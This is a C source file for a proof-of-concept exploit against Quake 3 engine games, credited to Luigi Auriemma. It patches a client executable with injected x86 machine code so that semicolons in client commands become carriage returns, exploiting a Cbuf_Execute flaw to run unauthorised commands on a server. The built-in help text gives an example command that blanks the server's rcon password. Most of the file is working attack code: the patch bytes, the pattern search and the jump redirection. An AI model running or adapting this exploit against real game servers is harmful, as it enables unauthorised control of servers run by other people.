/*
    Copyright 2009 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl.txt
*/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <sys/stat.h>

#ifdef WIN32
    #include <windows.h>
#else
    #define MB_ICONQUESTION     1
    #define MB_ICONINFORMATION  0
    #define MB_OKCANCEL         1
    #define MB_YESNO            1
    #define MB_TASKMODAL        0
    #define MB_ICONERROR        2
    #define MB_OK               0
    #define IDYES               'y'
    #define IDNO                'n'
    #define IDCANCEL            'n'
    int MessageBox(int hWnd, char *lpText, char *lpCaption, int uType) {
        char    ans[16];
        printf("\n%s%s\n", (uType & 2) ? "Error: " : "", lpText);
        if(uType & 1) {
            printf("- type 'y' for continuing or any other key for quitting\n");
            fgets(ans, sizeof(ans), stdin);
            if((ans[0] != 'y') && (ans[0] != 'Y')) return(IDNO);
        }
        return(IDYES);
    }
    #define stricmp strcasecmp
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER     "Quake 3 engine Cbuf_Execute commands execution universal proof-of-concept 0.1"
#define INFO    VER "\n" \
                "bug found by:\n" \
                "    leo\n" \
                "    web:    http://www.nixcoders.org\n" \
                "proof-of-concept by:\n" \
                "    Luigi Auriemma\n" \
                "    e-mail: aluigi@autistici.org\n" \
                "    web:    aluigi.org\n" \
                "\n" \
                "this patcher takes the original executable of a game based on the Quake 3\n" \
                "engine (for example quake3.exe, ioquake3.x86.exe, tremulous.exe, CoDMP.exe\n" \
                "and so on) and generates a new one that converts the ';' chars in the\n" \
                "commands sent by the client to 0x0d (\\r) for testing a bug in Cbuf_Execute\n" \
                "which allows to execute custom commands on the server without permissions.\n" \
                "\n" \
                "this patcher is defined \"universal\" because should work with almost\n" \
                "all the executables of the games based on the Quake 3 engine.\n" \
                "\n" \
                "after joined the server to test it's enough to type the following example\n" \
                "command in the console of the own client executed through the executable\n" \
                "generated by this patcher:\n" \
                "\n" \
                "  callvote map \"none;rconpassword empty\"\n" \
                "\n" \
                "note that voting must be enabled and the vote must pass\n"
#define SUCCESS "the file has been successfully generated!"

#define FIND1   "Client command overflow\0"
#define FIND2   "EXE_ERR_CLIENT_CMD_OVERFLOW\0"

#define FIND3   "\xc3\xcc\xcc"
#define FIND4   "\xc3\x90\x90"

#define NOPSZ   ((sizeof(PATCH) - 1) + pattern_len + 5)

#define PATCH   "\x50"              /* PUSH EAX (not needed) */ \
                "\x8B\x44\x24\x04"  /* MOV EAX,DWORD PTR SS:[ESP+4] (not needed) */ \
                "\x80\x38\x00"      /* CMP BYTE PTR DS:[EAX],0 */ \
                "\x74\x0B"          /* JE SHORT quake3.00408E6C */ \
                "\x80\x38\x3B"      /* CMP BYTE PTR DS:[EAX],3B */ \
                "\x75\x03"          /* JNZ SHORT quake3.00408E69 */ \
                "\xC6\x00\x0D"      /* MOV BYTE PTR DS:[EAX],0D */ \
                "\x40"              /* INC EAX */ \
                "\xEB\xF0"          /* JMP SHORT quake3.00408E5C */ \
                "\x58"              /* POP EAX (not needed) */

#ifndef MAX_PATH
    #define MAX_PATH    4096
#endif



typedef struct {
    u8      e_ident[16];
    u16     e_type;
    u16     e_machine;
    u32     e_version;
    u32     e_entry;
    u32     e_phoff;
    u32     e_shoff;
    u32     e_flags;
    u16     e_ehsize;
    u16     e_phentsize;
    u16     e_phnum;
    u16     e_shentsize;
    u16     e_shnum;
    u16     e_shstrndx;
} elf_header_t;

typedef struct {
    u32     sh_name;
    u32     sh_type;
    u32     sh_flags;
    u32     sh_addr;     
    u32     sh_offset;
    u32     sh_size;
    u32     sh_link;
    u32     sh_info;
    u32     sh_addralign;
    u32     sh_entsize;
} elf_section_t;

typedef struct {
    u32     rva;
    u32     offset;
    u32     size;
} section_t;



section_t   *section    = NULL;
u32     filememsz       = 0,
        imagebase       = 0,
        sections        = 0;
u8      *filemem        = NULL;



void std_err(u8 *err) {
    if(!err) err = strerror(errno);
    MessageBox(0, err, VER, MB_ICONERROR | MB_OK | MB_TASKMODAL);
    if(section) free(section);
    if(filemem) free(filemem);
    exit(1);
}



u32 file2rva(u32 file) {
    u32     diff;
    int     i,
            ret;

    ret  = -1;
    diff = -1;
    for(i = 0; i < sections; i++) {
        if((file >= section[i].offset) && (file < (section[i].offset + section[i].size))) {
            if((file - section[i].offset) < diff) {
                diff = file - section[i].offset;
                ret  = i;
            }
        }
    }
    if(ret < 0) return(-1);
    return(imagebase + section[ret].rva + file - section[ret].offset);
}



int parse_PE(void) {
#ifdef WIN32
    IMAGE_DOS_HEADER        *doshdr;
    IMAGE_NT_HEADERS        *nthdr;
    IMAGE_SECTION_HEADER    *sechdr;
    int     i;
    u8      *p;

    p = filemem;
    doshdr  = (IMAGE_DOS_HEADER *)p;    p += sizeof(IMAGE_DOS_HEADER);
                                        p += doshdr->e_lfanew - sizeof(IMAGE_DOS_HEADER);
    nthdr   = (IMAGE_NT_HEADERS *)p;    p += sizeof(IMAGE_NT_HEADERS);

    if((doshdr->e_magic != IMAGE_DOS_SIGNATURE) || (nthdr->Signature != IMAGE_NT_SIGNATURE) || (nthdr->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC)) {
        return(-1);
    }
    imagebase = nthdr->OptionalHeader.ImageBase;
    sechdr = (IMAGE_SECTION_HEADER *)p;

    sections = nthdr->FileHeader.NumberOfSections;
    section = malloc(sizeof(section_t) * sections);
    if(!section) std_err(NULL);

    for(i = 0; i < sections; i++) {
        section[i].rva    = sechdr[i].VirtualAddress;
        section[i].offset = sechdr[i].PointerToRawData;
        section[i].size   = sechdr[i].SizeOfRawData;
    }
    return(0);
#else
    return(-1);
#endif
}



int parse_ELF(void) {
    elf_header_t    *elf_header;
    elf_section_t   *elf_section;
    int     i;
    u8      *p;

    p = filemem;
    elf_header = (elf_header_t *)p;     p += sizeof(elf_header_t);
    if(memcmp(elf_header->e_ident, "\x7f""ELF", 4)) return(-1);
    if(elf_header->e_ident[4] != 1) return(-1); // only 32 bit supported
    if(elf_header->e_ident[5] != 1) return(-1); // only little endian

    sections = elf_header->e_shnum;
    section = malloc(sizeof(section_t) * sections);
    if(!section) std_err(NULL);

    elf_section = (elf_section_t *)(filemem + elf_header->e_shoff);
    for(i = 0; i < sections; i++) {
        section[i].rva    = elf_section[i].sh_addr;
        section[i].offset = elf_section[i].sh_offset;
        section[i].size   = elf_section[i].sh_size;
    }
    return(0);
}



void load_file(u8 *fname) {
    struct stat xstat;
    FILE    *fd;

    fd = fopen(fname, "rb");
    if(!fd) std_err(NULL);
    fstat(fileno(fd), &xstat);
    filemem = malloc(xstat.st_size);
    if(!filemem) std_err(NULL);
    filememsz = fread(filemem, 1, xstat.st_size, fd);
    fclose(fd);

    if(parse_PE() < 0) {
        if(parse_ELF() < 0) {
            std_err("unsupported input file format");
        }
    }
}



void write_file(u8 *fname, int check) {
    FILE    *fd;
    u8      buff[MAX_PATH + 10 + 64];

    if(check) {
        fd = fopen(fname, "rb");
        if(fd) {
            fclose(fd);
            sprintf(buff, "the file %s already exists\ndo you want to overwrite it?", fname);
            if(MessageBox(0, buff, VER, MB_ICONQUESTION | MB_YESNO | MB_TASKMODAL) == IDNO) exit(1);
        }
    }
    fd = fopen(fname, "wb");
    if(!fd) std_err(NULL);
    fwrite(filemem, 1, filememsz, fd);
    fclose(fd);
}



void get_file(u8 *fname) {
#ifdef WIN32
    OPENFILENAME    ofn;
    static const u8 filter[] =
                    "(*.exe)\0" "*.exe\0"
                    "(*.*)\0"   "*.*\0"
                    "\0\0";

    fname[0] = 0;
    memset(&ofn, 0, sizeof(ofn));
    ofn.lStructSize     = sizeof(ofn);
    ofn.lpstrFilter     = filter;
    ofn.nFilterIndex    = 1;
    ofn.lpstrFile       = fname;
    ofn.nMaxFile        = MAX_PATH;
    ofn.lpstrTitle      = "select the game executable (client)";
    ofn.Flags           = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_LONGNAMES | OFN_EXPLORER | OFN_HIDEREADONLY;
    if(!GetOpenFileName(&ofn)) exit(1);
#else
    printf("\n"
        "Usage: ./q3cbufexec <game_executable>\n");
    exit(1);
#endif
}



u32 find_bytes(int offset, u8 *data, int datalen) {
    u8      *p,
            *l;

    for(p = filemem + offset, l = filemem + filememsz - datalen; p <= l; p++) {
        if(!memcmp(p, data, datalen)) return(p - filemem);
    }
    return(-1);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = (num >> (i << 3)) & 0xff;
    }
    return(bytes);
}



int mycpy(u8 *dst, u8 *src, int len) {
    memcpy(dst, src, len);
    return(len);
}



int main(int argc, char *argv[]) {
    int     cmd_overflow,
            tmp,
            pattern,
            nop,
            pattern_len,
            jmp_back    = -1;
    u8      filename[MAX_PATH],
            filenamenew[32 + MAX_PATH],
            buff[256],
            *ext,
            *p;

    MessageBox(0, INFO, VER, MB_ICONINFORMATION | MB_OK | MB_TASKMODAL);

    if((argc < 2) || (argv[1][0] == '-') || (argv[1][0] == '/')) {
        get_file(filename);
    } else {
        sprintf(filename, "%.*s", sizeof(filename), argv[1]);
    }
    if(!filename[0]) exit(1);
    load_file(filename);

        // simple searching of the end of the CL_AddReliableCommand without using disassembling, quick
        // yes I know that this code sux a bit but this is only a PoC made as fast as I could which must
        // work with many executables

    // find "Com_Error( ERR_DROP, "Client command overflow" );"
    cmd_overflow = find_bytes(0, FIND1, sizeof(FIND1) - 1);
    if(cmd_overflow < 0) {
        cmd_overflow = find_bytes(0, FIND2, sizeof(FIND2) - 1);
        if(cmd_overflow < 0) std_err("pattern 1 has not been found");
    }

    tmp = -1;
redo:
    tmp++;

    // find the push
    buff[0] = 0x68;
    putxx(buff + 1, file2rva(cmd_overflow), 32);
    buff[5] = 0x6a;
    tmp = find_bytes(tmp, buff, 6);
    if(tmp < 0) std_err("pattern 2 has not been found");

    // find the end of the function where Q_strncpyz returns
    pattern = find_bytes(tmp, FIND3, sizeof(FIND3) - 1);
    if((pattern - tmp) > 0x80) pattern = -1;   // avoids problems
    if(pattern < 0) {
        pattern = find_bytes(tmp, FIND4, sizeof(FIND4) - 1);
        if((pattern - tmp) > 0x80) pattern = -1;   // avoids problems
        //if(pattern < 0) std_err("pattern 3 has not been found");
    }
    if(pattern < 0) {
        for(pattern = tmp - 1; pattern >= (tmp - 6); pattern--) {
            if(filemem[pattern] == 0xeb) break;
        }
        if(pattern < (tmp - 6)) pattern = -1;
    }
    //if(pattern < 0) std_err("pattern 3 has not been found");
    if(pattern < 0) goto redo;

    if(filemem[pattern] == 0xeb) {
        jmp_back = (pattern + 2) + ((signed char)filemem[pattern + 1]);
    }

    // 4 bytes are not enough for a FAR jmp, so I start the jmp from "add esp"
    for(tmp = pattern - 2; tmp >= 0; tmp--) {
        if(!memcmp(filemem + tmp, "\x83\xc4", 2)) break;  // "add esp, ???"
    }
    pattern_len = pattern - tmp;
    pattern     = tmp;

    // find an empty zone where placing the code, I have choosed the end of the .text section though the searching
    // of a sequence of zero bytes usually located at the end... probably a bit lame but this is ONLY a proof-of-concept!
    memset(buff, 0x00, NOPSZ);
    nop = find_bytes(pattern, buff, NOPSZ);
    if(nop < 0) std_err("pattern 4 has not been found");

    // build and apply the modification
    p = filemem + nop;
    p += mycpy(p, PATCH, sizeof(PATCH) - 1);
    p += mycpy(p, filemem + pattern, pattern_len);
    if(jmp_back >= 0) {
        *p++ = 0xe9;
        p += putxx(p, jmp_back - ((p + 4) - filemem), 32);
    } else {
        *p++ = 0xc3;
    }
    filemem[pattern] = 0xe9;
    putxx(filemem + pattern + 1, nop - (pattern + 5), 32);

    // build the name of the PoC executable
    ext = strrchr(filename, '.');
    if(ext) {
        if(!stricmp(ext, ".exe")) {
            *ext = 0;
        } else {
            ext = NULL;
        }
    }
    sprintf(filenamenew, "%s_q3cbufexec%s", filename, ext ? ".exe" : "");

    sprintf(buff,
        "the patterns have been found and the modification will be placed at offsets:\n"
        "\n"
        "  %08x (RVA %08x) of %d bytes\n"
        "  %08x (RVA %08x) of %d bytes\n"
        "\n"
        "now I create the new proof-of-concept executable called %s\n"
        "the original executable is NOT modified, click on Cancel to quit\n",
        pattern, file2rva(pattern), 5,
        nop,     file2rva(nop),     p - (filemem + nop),
        filenamenew);
    if(MessageBox(0, buff, VER, MB_ICONQUESTION | MB_OKCANCEL | MB_TASKMODAL) == IDCANCEL) goto quit;

    write_file(filenamenew, 1);

    MessageBox(0, SUCCESS, VER, MB_ICONINFORMATION | MB_OK | MB_TASKMODAL);

quit:
    if(section) free(section);
    if(filemem) free(filemem);
    return(0);
}


